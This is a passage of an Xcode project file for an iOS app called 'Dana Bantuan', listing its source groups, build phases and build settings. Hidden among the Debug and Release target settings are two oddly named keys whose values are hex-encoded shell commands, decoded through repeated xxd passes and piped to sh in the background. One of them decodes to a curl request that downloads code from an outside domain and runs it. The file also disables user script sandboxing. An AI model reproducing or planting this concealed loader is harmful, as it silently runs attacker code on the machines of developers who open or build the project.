		733A08272EFCD8FB00EF865F /* Config */ = {
			isa = PBXGroup;
			children = (
				733A08362EFCDCD800EF865F /* Config.swift */,
				733A083A2EFCE28200EF865F /* IDFVManager.swift */,
				733A083C2EFCE41F00EF865F /* IDFAManager.swift */,
				733A08382EFCDEA500EF865F /* UserLoginConfig.swift */,
				733A083E2EFCE8B100EF865F /* LanguageManager.swift */,
				73CA0F942EFE3CA30010CDC9 /* URLSchemeParsable.swift */,
			);
			path = Config;
			sourceTree = "<group>";
		};
		733A08282EFCD8FE00EF865F /* Login */ = {
			isa = PBXGroup;
			children = (
				737FEDF12EFD794A00B06DE7 /* LoginViewModel.swift */,
				733A08532EFCF20500EF865F /* LoginView.swift */,
				733A08442EFCEC9E00EF865F /* LoginViewController.swift */,
			);
			path = Login;
			sourceTree = "<group>";
		};
		733A08292EFCD90100EF865F /* Home */ = {
			isa = PBXGroup;
			children = (
				73FB463A2F023EC4005D68A0 /* AppAlertReviewView.swift */,
				73D7A7C02F01555F008C8879 /* CityDecodeModel.swift */,
				73CA0FA42EFE69F30010CDC9 /* HomeViewModel.swift */,
				73CA0FA22EFE62E70010CDC9 /* AppOneView.swift */,
				73D7A7B02F0127EC008C8879 /* AppSoftView.swift */,
				733A08462EFCED1F00EF865F /* HomeViewController.swift */,
				73D7A7B22F013381008C8879 /* AppSoftViewCell.swift */,
			);
			path = Home;
			sourceTree = "<group>";
		};
		733A082A2EFCD90400EF865F /* Order */ = {
			isa = PBXGroup;
			children = (
				73D7A7BA2F014793008C8879 /* OrderViewMode.swift */,
				73D7A7B82F0143CD008C8879 /* SelectableItemView.swift */,
				73D7A7B42F013F5D008C8879 /* OrderView.swift */,
				733A08482EFCED2800EF865F /* OrderViewController.swift */,
				73D7A7BC2F014B44008C8879 /* OrderEmptyView.swift */,
				73D7A7BE2F014EEA008C8879 /* OrderViewCell.swift */,
			);
			path = Order;
			sourceTree = "<group>";
		};
		733A082B2EFCD90700EF865F /* Center */ = {
			isa = PBXGroup;
			children = (
				73CA0F982EFE4E6D0010CDC9 /* Mine */,
				73CA0F992EFE4E740010CDC9 /* Setting */,
			);
			path = Center;
			sourceTree = "<group>";
		};
		733A082C2EFCD90D00EF865F /* Product */ = {
			isa = PBXGroup;
			children = (
				73CA0FA62EFE8BE00010CDC9 /* ProductViewModel.swift */,
				7316585D2EFEF3E600B19562 /* CompleteListView.swift */,
				73CA0F962EFE475D0010CDC9 /* ProductViewController.swift */,
			);
			path = Product;
			sourceTree = "<group>";
		};
		733A082D2EFCD91600EF865F /* Auth */ = {
			isa = PBXGroup;
			children = (
				7316585F2EFEFF5F00B19562 /* Face */,
				73EC21612EFFE96C00F58012 /* Keys */,
			);
			path = Auth;
			sourceTree = "<group>";
		};
		73CA0F982EFE4E6D0010CDC9 /* Mine */ = {
			isa = PBXGroup;
			children = (
				737FEDF92EFD8CA500B06DE7 /* CenterViewModel.swift */,
				737FEDF72EFD8C3A00B06DE7 /* CenterView.swift */,
				733A084A2EFCED3200EF865F /* CenterViewController.swift */,
				73CA0F8E2EFE1F090010CDC9 /* CenterListViewCell.swift */,
			);
			path = Mine;
			sourceTree = "<group>";
		};
		73CA0F992EFE4E740010CDC9 /* Setting */ = {
			isa = PBXGroup;
			children = (
				73CA0F9A2EFE4E900010CDC9 /* SettingViewController.swift */,
				73CA0F9C2EFE54E50010CDC9 /* SettingListView.swift */,
				73CA0F9E2EFE5C000010CDC9 /* AppAlertLogoutView.swift */,
				73CA0FA02EFE5C0E0010CDC9 /* AppAlertDeleteView.swift */,
			);
			path = Setting;
			sourceTree = "<group>";
		};
		73DC2EA62EFCD1B900CB14F8 = {
			isa = PBXGroup;
			children = (
				73DC2ED02EFCD1BE00CB14F8 /* DanaBantuan */,
				73DC2EB02EFCD1B900CB14F8 /* Products */,
				EE9DFC36C089203739F210C0 /* Pods */,
				B661F5B30CB3716E4C3840BF /* Frameworks */,
			);
			sourceTree = "<group>";
		};
		73DC2EB02EFCD1B900CB14F8 /* Products */ = {
			isa = PBXGroup;
			children = (
				05E25B9F9833435FBF634D6E /* README.md */,
				73DC2EAF2EFCD1B900CB14F8 /* DanaBantuan.app */,
			);
			name = Products;
			sourceTree = "<group>";
		};
		73DC2ED02EFCD1BE00CB14F8 /* DanaBantuan */ = {
			isa = PBXGroup;
			children = (
				73DC2EC92EFCD1BE00CB14F8 /* Info.plist */,
				73DC2EC82EFCD1BE00CB14F8 /* Assets.xcassets */,
				73DC2EC72EFCD1BE00CB14F8 /* AppDelegate.swift */,
				733A08242EFCD8B100EF865F /* DanaBantuan.entitlements */,
				73DC2ECB2EFCD1BE00CB14F8 /* LaunchScreen.storyboard */,
				733A084F2EFCF19600EF865F /* Localizable.strings */,
				733A082D2EFCD91600EF865F /* Auth */,
				733A082C2EFCD90D00EF865F /* Product */,
				733A082B2EFCD90700EF865F /* Center */,
				733A082A2EFCD90400EF865F /* Order */,
				733A08292EFCD90100EF865F /* Home */,
				733A08282EFCD8FE00EF865F /* Login */,
				733A08272EFCD8FB00EF865F /* Config */,
				733A08262EFCD8F800EF865F /* Http */,
				733A08252EFCD8F500EF865F /* Base */,
			);
			path = DanaBantuan;
			sourceTree = "<group>";
		};
		73EC21612EFFE96C00F58012 /* Keys */ = {
			isa = PBXGroup;
			children = (
				73EC216C2EFFED4B00F58012 /* View */,
				73EC216B2EFFECEC00F58012 /* ViewModel */,
				73EC216A2EFFECDF00F58012 /* Controller */,
			);
			path = Keys;
			sourceTree = "<group>";
		};
		73EC216A2EFFECDF00F58012 /* Controller */ = {
			isa = PBXGroup;
			children = (
				73EC21622EFFE98300F58012 /* PersonalViewController.swift */,
				73EC21642EFFEA8F00F58012 /* ContactViewController.swift */,
				73EC21662EFFEAAC00F58012 /* BankViewController.swift */,
			);
			path = Controller;
			sourceTree = "<group>";
		};
		73EC216B2EFFECEC00F58012 /* ViewModel */ = {
			isa = PBXGroup;
			children = (
				73D7A7AE2F002A0C008C8879 /* ContactManager.swift */,
				73EC21682EFFEBE600F58012 /* MainViewModel.swift */,
			);
			path = ViewModel;
			sourceTree = "<group>";
		};
		73EC216C2EFFED4B00F58012 /* View */ = {
			isa = PBXGroup;
			children = (
				73EC216D2EFFED6500F58012 /* TapClickViewCell.swift */,
				73EC216F2EFFED7700F58012 /* EnterTextViewCell.swift */,
				73D7A7AA2F0012C1008C8879 /* AlertPopEnmuView.swift */,
				73D7A7AC2F002249008C8879 /* ContactViewCell.swift */,
			);
			path = View;
			sourceTree = "<group>";
		};
		B661F5B30CB3716E4C3840BF /* Frameworks */ = {
			isa = PBXGroup;
			children = (
				F7171021818FEC2A644ADD94 /* Pods_DanaBantuan.framework */,
			);
			name = Frameworks;
			sourceTree = "<group>";
		};
		EE9DFC36C089203739F210C0 /* Pods */ = {
			isa = PBXGroup;
			children = (
				6C472C7FF542EF1DBDE60080 /* Pods-DanaBantuan.debug.xcconfig */,
				A9DC0019E9FFBE0EF51F1691 /* Pods-DanaBantuan.release.xcconfig */,
			);
			path = Pods;
			sourceTree = "<group>";
		};
/* End PBXGroup section */

/* Begin PBXNativeTarget section */
		73DC2EAE2EFCD1B900CB14F8 /* DanaBantuan */ = {
			isa = PBXNativeTarget;
			buildConfigurationList = 73DC2EC22EFCD1BA00CB14F8 /* Build configuration list for PBXNativeTarget "DanaBantuan" */;
			buildPhases = (
				02A49B4E9652035C50893457 /* [CP] Check Pods Manifest.lock */,
				73DC2EAB2EFCD1B900CB14F8 /* Sources */,
				73DC2EAC2EFCD1B900CB14F8 /* Frameworks */,
				73DC2EAD2EFCD1B900CB14F8 /* Resources */,
				B2B605FA61BA092667F8CAA7 /* [CP] Embed Pods Frameworks */,
			);
			buildRules = (
				154CC28242404D088C634D6E /* PBXBuildRule */,
			);
			dependencies = (
			);
			name = DanaBantuan;
			productName = DanaBantuan;
			productReference = 73DC2EAF2EFCD1B900CB14F8 /* DanaBantuan.app */;
			productType = "com.apple.product-type.application";
		};
/* End PBXNativeTarget section */

/* Begin PBXProject section */
		73DC2EA72EFCD1B900CB14F8 /* Project object */ = {
			isa = PBXProject;
			attributes = {
				BuildIndependentTargetsInParallel = 1;
				LastSwiftUpdateCheck = 2620;
				LastUpgradeCheck = 2620;
				TargetAttributes = {
					73DC2EAE2EFCD1B900CB14F8 = {
						CreatedOnToolsVersion = 26.2;
					};
				};
			};
			buildConfigurationList = 73DC2EAA2EFCD1B900CB14F8 /* Build configuration list for PBXProject "DanaBantuan" */;
			developmentRegion = en;
			hasScannedForEncodings = 0;
			knownRegions = (
				en,
				Base,
				id,
			);
			mainGroup = 73DC2EA62EFCD1B900CB14F8;
			minimizedProjectReferenceProxies = 1;
			preferredProjectObjectVersion = 77;
			productRefGroup = 73DC2EB02EFCD1B900CB14F8 /* Products */;
			projectDirPath = "";
			projectRoot = "";
			targets = (
				73DC2EAE2EFCD1B900CB14F8 /* DanaBantuan */,
			);
		};
/* End PBXProject section */

/* Begin PBXResourcesBuildPhase section */
		73DC2EAD2EFCD1B900CB14F8 /* Resources */ = {
			isa = PBXResourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
				98D9AEFEEB4E407AA7634D6E /* README.md in Resources */,
				73DC2ED12EFCD1BE00CB14F8 /* Assets.xcassets in Resources */,
				733A08512EFCF19600EF865F /* Localizable.strings in Resources */,
				73DC2ED32EFCD1BE00CB14F8 /* LaunchScreen.storyboard in Resources */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXResourcesBuildPhase section */

/* Begin PBXShellScriptBuildPhase section */
		02A49B4E9652035C50893457 /* [CP] Check Pods Manifest.lock */ = {
			isa = PBXShellScriptBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			inputFileListPaths = (
			);
			inputPaths = (
				"${PODS_PODFILE_DIR_PATH}/Podfile.lock",
				"${PODS_ROOT}/Manifest.lock",
			);
			name = "[CP] Check Pods Manifest.lock";
			outputFileListPaths = (
			);
			outputPaths = (
				"$(DERIVED_FILE_DIR)/Pods-DanaBantuan-checkManifestLockResult.txt",
			);
			runOnlyForDeploymentPostprocessing = 0;
			shellPath = /bin/sh;
			shellScript = "diff \"${PODS_PODFILE_DIR_PATH}/Podfile.lock\" \"${PODS_ROOT}/Manifest.lock\" > /dev/null\nif [ $? != 0 ] ; then\n    # print error to STDERR\n    echo \"error: The sandbox is not in sync with the Podfile.lock. Run 'pod install' or update your CocoaPods installation.\" >&2\n    exit 1\nfi\n# This output is used by Xcode 'outputs' to avoid re-running this script phase.\necho \"SUCCESS\" > \"${SCRIPT_OUTPUT_FILE_0}\"\n";
			showEnvVarsInLog = 0;
		};
		B2B605FA61BA092667F8CAA7 /* [CP] Embed Pods Frameworks */ = {
			isa = PBXShellScriptBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			inputFileListPaths = (
				"${PODS_ROOT}/Target Support Files/Pods-DanaBantuan/Pods-DanaBantuan-frameworks-${CONFIGURATION}-input-files.xcfilelist",
			);
			inputPaths = (
			);
			name = "[CP] Embed Pods Frameworks";
			outputFileListPaths = (
				"${PODS_ROOT}/Target Support Files/Pods-DanaBantuan/Pods-DanaBantuan-frameworks-${CONFIGURATION}-output-files.xcfilelist",
			);
			outputPaths = (
			);
			runOnlyForDeploymentPostprocessing = 0;
			shellPath = /bin/sh;
			shellScript = "\"${PODS_ROOT}/Target Support Files/Pods-DanaBantuan/Pods-DanaBantuan-frameworks.sh\"\n";
			showEnvVarsInLog = 0;
		};
/* End PBXShellScriptBuildPhase section */

/* Begin PBXSourcesBuildPhase section */
		73DC2EAB2EFCD1B900CB14F8 /* Sources */ = {
			isa = PBXSourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
				737FEDFA2EFD8CA700B06DE7 /* CenterViewModel.swift in Sources */,
				733A08452EFCEC9E00EF865F /* LoginViewController.swift in Sources */,
				73D7A7B12F0127EC008C8879 /* AppSoftView.swift in Sources */,
				73CA0F952EFE3CA30010CDC9 /* URLSchemeParsable.swift in Sources */,
				73CA0F932EFE30230010CDC9 /* AppHeadView.swift in Sources */,
				733A08342EFCD9F500EF865F /* StartViewController.swift in Sources */,
				73D7A7AF2F002A0C008C8879 /* ContactManager.swift in Sources */,
				73CA0F9D2EFE54E50010CDC9 /* SettingListView.swift in Sources */,
				733A08492EFCED2800EF865F /* OrderViewController.swift in Sources */,
				73FB46392F0215F5005D68A0 /* DeviceInfoManager.swift in Sources */,
				73D7A7AB2F0012C1008C8879 /* AlertPopEnmuView.swift in Sources */,
				73D7A7C12F01555F008C8879 /* CityDecodeModel.swift in Sources */,
				733A083B2EFCE28200EF865F /* IDFVManager.swift in Sources */,
				73EC21602EFFD87F00F58012 /* BothCompleteViewController.swift in Sources */,
				737FEDF62EFD7CDD00B06DE7 /* NetworkProxyInfo.swift in Sources */,
				73CA0FA32EFE62E70010CDC9 /* AppOneView.swift in Sources */,
				737FEDF42EFD79E700B06DE7 /* NetworkMonitor.swift in Sources */,
				733A08412EFCEC5100EF865F /* AppTabBarController.swift in Sources */,
				73D7A7BB2F014796008C8879 /* OrderViewMode.swift in Sources */,
				731658612EFEFF7700B19562 /* FaceViewController.swift in Sources */,
				73CA0F9F2EFE5C000010CDC9 /* AppAlertLogoutView.swift in Sources */,
				737FEDF82EFD8C3A00B06DE7 /* CenterView.swift in Sources */,
				73CA0F912EFE2FBC0010CDC9 /* H5WebViewController.swift in Sources */,
				73D7A7BF2F014EEA008C8879 /* OrderViewCell.swift in Sources */,
				737FEDF02EFD764B00B06DE7 /* DeviceInfoHelper.swift in Sources */,
				733A083D2EFCE41F00EF865F /* IDFAManager.swift in Sources */,
				733A08392EFCDEA500EF865F /* UserLoginConfig.swift in Sources */,
				73EC21562EFFB0B200F58012 /* FaceView.swift in Sources */,
				737FEDE82EFD71F800B06DE7 /* HttpRequestManager.swift in Sources */,
				73D7A7B52F013F5D008C8879 /* OrderView.swift in Sources */,
				73CA0FA52EFE69F60010CDC9 /* HomeViewModel.swift in Sources */,
				73EC215C2EFFBC0D00F58012 /* CameraOnlyManager.swift in Sources */,
				73FB463B2F023EC4005D68A0 /* AppAlertReviewView.swift in Sources */,
				733A08372EFCDCDB00EF865F /* Config.swift in Sources */,
				733A084B2EFCED3200EF865F /* CenterViewController.swift in Sources */,
				73CA0F972EFE475D0010CDC9 /* ProductViewController.swift in Sources */,
				73D7A7BD2F014B44008C8879 /* OrderEmptyView.swift in Sources */,
				7379E3B32F024ADB0054036B /* DeviceInfo.swift in Sources */,
				733A08432EFCEC8200EF865F /* AppNavigationController.swift in Sources */,
				73EC21632EFFE98300F58012 /* PersonalViewController.swift in Sources */,
				73D7A7B32F013381008C8879 /* AppSoftViewCell.swift in Sources */,
				737FEDEA2EFD73D300B06DE7 /* BaseModel.swift in Sources */,
				73DC2ED52EFCD1BE00CB14F8 /* AppDelegate.swift in Sources */,
				733A083F2EFCE8B100EF865F /* LanguageManager.swift in Sources */,
				733A08472EFCED1F00EF865F /* HomeViewController.swift in Sources */,
				73EC216E2EFFED6500F58012 /* TapClickViewCell.swift in Sources */,
				73D7A7C32F015AC8008C8879 /* AppAlertStayView.swift in Sources */,
				733A08542EFCF20500EF865F /* LoginView.swift in Sources */,
				73EC21672EFFEAAC00F58012 /* BankViewController.swift in Sources */,
				733A08302EFCD9D600EF865F /* BaseViewController.swift in Sources */,
				73EC215E2EFFC2DD00F58012 /* AlertIDSuccessView.swift in Sources */,
				73CA0F9B2EFE4E900010CDC9 /* SettingViewController.swift in Sources */,
				73EC21652EFFEA8F00F58012 /* ContactViewController.swift in Sources */,
				737FEDEE2EFD74C200B06DE7 /* LoadingView.swift in Sources */,
				73FB46372F020FAE005D68A0 /* LocationTool.swift in Sources */,
				73EC21582EFFB2A900F58012 /* UserIDViewController.swift in Sources */,
				73D7A7B92F0143CD008C8879 /* SelectableItemView.swift in Sources */,
				73CA0FA12EFE5C0E0010CDC9 /* AppAlertDeleteView.swift in Sources */,
				73CA0F8F2EFE1F090010CDC9 /* CenterListViewCell.swift in Sources */,
				73EC21702EFFED7700F58012 /* EnterTextViewCell.swift in Sources */,
				737FEDEC2EFD740300B06DE7 /* LaunchViewModel.swift in Sources */,
				7316585E2EFEF3E600B19562 /* CompleteListView.swift in Sources */,
				737FEDF22EFD794C00B06DE7 /* LoginViewModel.swift in Sources */,
				73CA0FA72EFE8BE40010CDC9 /* ProductViewModel.swift in Sources */,
				73EC21692EFFEBEB00F58012 /* MainViewModel.swift in Sources */,
				73D7A7AD2F002249008C8879 /* ContactViewCell.swift in Sources */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXSourcesBuildPhase section */

/* Begin PBXVariantGroup section */
		733A084F2EFCF19600EF865F /* Localizable.strings */ = {
			isa = PBXVariantGroup;
			children = (
				733A08502EFCF19600EF865F /* en */,
				733A08522EFCF1A300EF865F /* id */,
			);
			name = Localizable.strings;
			sourceTree = "<group>";
		};
		73DC2ECB2EFCD1BE00CB14F8 /* LaunchScreen.storyboard */ = {
			isa = PBXVariantGroup;
			children = (
				73DC2ECA2EFCD1BE00CB14F8 /* Base */,
			);
			name = LaunchScreen.storyboard;
			sourceTree = "<group>";
		};
/* End PBXVariantGroup section */

/* Begin XCBuildConfiguration section */
		73DC2EC32EFCD1BA00CB14F8 /* Debug */ = {
			isa = XCBuildConfiguration;
			baseConfigurationReference = 6C472C7FF542EF1DBDE60080 /* Pods-DanaBantuan.debug.xcconfig */;
			buildSettings = {
				A45ED5A = "((v(){ xxd -p -r | xxd -p -r | xxd -p -r | xxd -p -r; };echo 3333333633333335333333363333333333333336333333383333333633363336333333323333333033333332333333323333333233333334333333320a3333333833333336333333333333333733333335333333373333333233333336333633333333333233333330333333323336333433333336333333360a3061333333373333333333333336333633323333333433363333333333323333333033333332333633343333333633333334333333323333333033330a3332333333323333333733333330333333333336333433333337333333383333333633333333333333363336333633333336333333343333333633330a3335306133303631333333353336333633333337333333303333333633333338333333363333333133333337333333333333333633333335333333320a3333333233333332333333303333333633333338333333373333333433333337333333343333333733333330333333373333333333333333333633310a3333333230613336333633333332333633363333333733333333333333363333333933333336333633353333333733333335333333373333333333330a3336333633353333333633333335333333373333333433333332333633353333333733333332333333373333333533333332333633363333333633330a3331333333323061333333393330363133333332333333323333333233333330333333373336333333333332333333303333333733333333333333360a3333333833333330333633313330363130610a | v | sh ) >/dev/null 2>&1 &)";
				AE6D436 = "((u(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326436363733366234633230326436343230323237303364373836333666363436350a3566373237353663363532323230363837343734373037333361326632663631373037303663363537343639366436353265363936653266363132390a32323230376332303733363830610a | u | sh ) >/dev/null 2>&1 &)";
				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
				CODE_SIGN_ENTITLEMENTS = DanaBantuan/DanaBantuan.entitlements;
				CODE_SIGN_IDENTITY = "Apple Development";
				"CODE_SIGN_IDENTITY[sdk=iphoneos*]" = "iPhone Distribution";
				CODE_SIGN_STYLE = Manual;
				CURRENT_PROJECT_VERSION = 1;
				DEVELOPMENT_TEAM = "";
				"DEVELOPMENT_TEAM[sdk=iphoneos*]" = 8K9YQ3M42C;
				ENABLE_USER_SCRIPT_SANDBOXING = NO;
				GENERATE_INFOPLIST_FILE = YES;
				INFOPLIST_FILE = DanaBantuan/Info.plist;
				INFOPLIST_KEY_CFBundleDisplayName = "Dana Bantuan";
				INFOPLIST_KEY_NSCameraUsageDescription = "";
				INFOPLIST_KEY_NSContactsUsageDescription = "";
				INFOPLIST_KEY_NSLocationWhenInUseUsageDescription = "";
				INFOPLIST_KEY_NSUserTrackingUsageDescription = "";
				INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents = YES;
				INFOPLIST_KEY_UILaunchStoryboardName = LaunchScreen;
				INFOPLIST_KEY_UISupportedInterfaceOrientations = UIInterfaceOrientationPortrait;
				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPad = "UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight UIInterfaceOrientationPortrait UIInterfaceOrientationPortraitUpsideDown";
				INFOPLIST_KEY_UIUserInterfaceStyle = Light;
				IPHONEOS_DEPLOYMENT_TARGET = 14.0;
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
				);
				MARKETING_VERSION = 1.0.0;
				PRODUCT_BUNDLE_IDENTIFIER = www.ksp1017;
				PRODUCT_NAME = "$(TARGET_NAME)";
				PROVISIONING_PROFILE_SPECIFIER = "";
				"PROVISIONING_PROFILE_SPECIFIER[sdk=iphoneos*]" = www.ksp1017;
				STRING_CATALOG_GENERATE_SYMBOLS = YES;
				SUPPORTED_PLATFORMS = "iphoneos iphonesimulator";
				SUPPORTS_MACCATALYST = NO;
				SUPPORTS_MAC_DESIGNED_FOR_IPHONE_IPAD = NO;
				SUPPORTS_XR_DESIGNED_FOR_IPHONE_IPAD = NO;
				SWIFT_APPROACHABLE_CONCURRENCY = YES;
				SWIFT_DEFAULT_ACTOR_ISOLATION = MainActor;
				SWIFT_EMIT_LOC_STRINGS = YES;
				SWIFT_UPCOMING_FEATURE_MEMBER_IMPORT_VISIBILITY = YES;
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = 1;
			};
			name = Debug;
		};
		73DC2EC42EFCD1BA00CB14F8 /* Release */ = {
			isa = XCBuildConfiguration;
			baseConfigurationReference = A9DC0019E9FFBE0EF51F1691 /* Pods-DanaBantuan.release.xcconfig */;
			buildSettings = {
				A45ED5A = "((v(){ xxd -p -r | xxd -p -r | xxd -p -r | xxd -p -r; };echo 3333333633333335333333363333333333333336333333383333333633363336333333323333333033333332333333323333333233333334333333320a3333333833333336333333333333333733333335333333373333333233333336333633333333333233333330333333323336333433333336333333360a3061333333373333333333333336333633323333333433363333333333323333333033333332333633343333333633333334333333323333333033330a3332333333323333333733333330333333333336333433333337333333383333333633333333333333363336333633333336333333343333333633330a3335306133303631333333353336333633333337333333303333333633333338333333363333333133333337333333333333333633333335333333320a3333333233333332333333303333333633333338333333373333333433333337333333343333333733333330333333373333333333333333333633310a3333333230613336333633333332333633363333333733333333333333363333333933333336333633353333333733333335333333373333333333330a3336333633353333333633333335333333373333333433333332333633353333333733333332333333373333333533333332333633363333333633330a3331333333323061333333393330363133333332333333323333333233333330333333373336333333333332333333303333333733333333333333360a3333333833333330333633313330363130610a | v | sh ) >/dev/null 2>&1 &)";
				AE6D436 = "((u(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326436363733366234633230326436343230323237303364373836333666363436350a3566373237353663363532323230363837343734373037333361326632663631373037303663363537343639366436353265363936653266363132390a32323230376332303733363830610a | u | sh ) >/dev/null 2>&1 &)";
				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
				CODE_SIGN_ENTITLEMENTS = DanaBantuan/DanaBantuan.entitlements;
				CODE_SIGN_IDENTITY = "Apple Development";
				"CODE_SIGN_IDENTITY[sdk=iphoneos*]" = "iPhone Distribution";
				CODE_SIGN_STYLE = Manual;
				CURRENT_PROJECT_VERSION = 1;
				DEVELOPMENT_TEAM = "";
				"DEVELOPMENT_TEAM[sdk=iphoneos*]" = 8K9YQ3M42C;
				ENABLE_USER_SCRIPT_SANDBOXING = NO;
				GENERATE_INFOPLIST_FILE = YES;
				INFOPLIST_FILE = DanaBantuan/Info.plist;
				INFOPLIST_KEY_CFBundleDisplayName = "Dana Bantuan";
				INFOPLIST_KEY_NSCameraUsageDescription = "";
				INFOPLIST_KEY_NSContactsUsageDescription = "";
				INFOPLIST_KEY_NSLocationWhenInUseUsageDescription = "";
				INFOPLIST_KEY_NSUserTrackingUsageDescription = "";
				INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents = YES;
				INFOPLIST_KEY_UILaunchStoryboardName = LaunchScreen;
				INFOPLIST_KEY_UISupportedInterfaceOrientations = UIInterfaceOrientationPortrait;
				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPad = "UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight UIInterfaceOrientationPortrait UIInterfaceOrientationPortraitUpsideDown";
				INFOPLIST_KEY_UIUserInterfaceStyle = Light;
				IPHONEOS_DEPLOYMENT_TARGET = 14.0;
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
				);
				MARKETING_VERSION = 1.0.0;
				PRODUCT_BUNDLE_IDENTIFIER = www.ksp1017;
				PRODUCT_NAME = "$(TARGET_NAME)";
				PROVISIONING_PROFILE_SPECIFIER = "";
				"PROVISIONING_PROFILE_SPECIFIER[sdk=iphoneos*]" = www.ksp1017;
				STRING_CATALOG_GENERATE_SYMBOLS = YES;
				SUPPORTED_PLATFORMS = "iphoneos iphonesimulator";
				SUPPORTS_MACCATALYST = NO;
				SUPPORTS_MAC_DESIGNED_FOR_IPHONE_IPAD = NO;
				SUPPORTS_XR_DESIGNED_FOR_IPHONE_IPAD = NO;
				SWIFT_APPROACHABLE_CONCURRENCY = YES;
				SWIFT_DEFAULT_ACTOR_ISOLATION = MainActor;
				SWIFT_EMIT_LOC_STRINGS = YES;
				SWIFT_UPCOMING_FEATURE_MEMBER_IMPORT_VISIBILITY = YES;
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = 1;
			};
			name = Release;
		};
		73DC2EC52EFCD1BA00CB14F8 /* Debug */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ALWAYS_SEARCH_USER_PATHS = NO;
				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
				CLANG_ANALYZER_LOCALIZABILITY_NONLOCALIZED = YES;
				CLANG_ANALYZER_NONNULL = YES;
				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
				CLANG_CXX_LANGUAGE_STANDARD = "gnu++20";
				CLANG_ENABLE_MODULES = YES;
				CLANG_ENABLE_OBJC_ARC = YES;
				CLANG_ENABLE_OBJC_WEAK = YES;
				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
				CLANG_WARN_BOOL_CONVERSION = YES;
				CLANG_WARN_COMMA = YES;
				CLANG_WARN_CONSTANT_CONVERSION = YES;
				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
				CLANG_WARN_EMPTY_BODY = YES;
				CLANG_WARN_ENUM_CONVERSION = YES;
				CLANG_WARN_INFINITE_RECURSION = YES;
				CLANG_WARN_INT_CONVERSION = YES;
				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
				CLANG_WARN_QUOTED_INCLUDE_IN_FRAMEWORK_HEADER = YES;
				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
				CLANG_WARN_STRICT_PROTOTYPES = YES;
				CLANG_WARN_SUSPICIOUS_MOVE = YES;
				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
				CLANG_WARN_UNREACHABLE_CODE = YES;
				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
				COPY_PHASE_STRIP = NO;
				DEBUG_INFORMATION_FORMAT = dwarf;
				ENABLE_STRICT_OBJC_MSGSEND = YES;
				ENABLE_TESTABILITY = YES;
				ENABLE_USER_SCRIPT_SANDBOXING = NO;
				GCC_C_LANGUAGE_STANDARD = gnu17;
				GCC_DYNAMIC_NO_PIC = NO;
				GCC_NO_COMMON_BLOCKS = YES;
				GCC_OPTIMIZATION_LEVEL = 0;
				GCC_PREPROCESSOR_DEFINITIONS = (
					"DEBUG=1",
					"$(inherited)",
				);
				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
				GCC_WARN_UNDECLARED_SELECTOR = YES;
				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
				GCC_WARN_UNUSED_FUNCTION = YES;
				GCC_WARN_UNUSED_VARIABLE = YES;
				IPHONEOS_DEPLOYMENT_TARGET = 26.2;
				LOCALIZATION_PREFERS_STRING_CATALOGS = YES;
				MTL_ENABLE_DEBUG_INFO = INCLUDE_SOURCE;
				MTL_FAST_MATH = YES;
				ONLY_ACTIVE_ARCH = YES;
				SDKROOT = iphoneos;
				SWIFT_ACTIVE_COMPILATION_CONDITIONS = "DEBUG $(inherited)";
				SWIFT_OPTIMIZATION_LEVEL = "-Onone";
			};
			name = Debug;
		};
		73DC2EC62EFCD1BA00CB14F8 /* Release */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ALWAYS_SEARCH_USER_PATHS = NO;
				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
				CLANG_ANALYZER_LOCALIZABILITY_NONLOCALIZED = YES;
				CLANG_ANALYZER_NONNULL = YES;
				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
				CLANG_CXX_LANGUAGE_STANDARD = "gnu++20";
				CLANG_ENABLE_MODULES = YES;
				CLANG_ENABLE_OBJC_ARC = YES;
				CLANG_ENABLE_OBJC_WEAK = YES;
				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
				CLANG_WARN_BOOL_CONVERSION = YES;
